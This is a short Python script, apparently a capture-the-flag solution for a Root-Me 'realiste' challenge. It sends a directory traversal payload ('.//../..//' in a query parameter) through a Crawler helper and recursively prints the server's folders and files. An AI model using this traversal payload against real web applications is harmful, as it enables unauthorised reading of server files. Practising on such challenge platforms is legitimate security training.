#!/usr/bin/python3
from doctest import TestResults
from Crawler import Crawler

BASE_URL='http://challenge01.root-me.org/realiste/ch14/?'
PAYLOAD='p=annonces&a=.//../..//'

def listFilesRecursively(parent):
    if parent.child != []:
        print(parent.whoami)
        print("folder: " + str(parent.dir))
        print('files : ' + str(parent.files))
        for node in parent.child:
            listFilesRecursively(node)
        return True
    else:
        print(parent.whoami)
        print('files : ' + str(parent.files))
        return True
    
CrawlerObj = Crawler(BASE_URL, PAYLOAD)
CrawlerObj.initTree()
CrawlerObj.fillTree(CrawlerObj.tree.root)
listFilesRecursively(CrawlerObj.tree.root)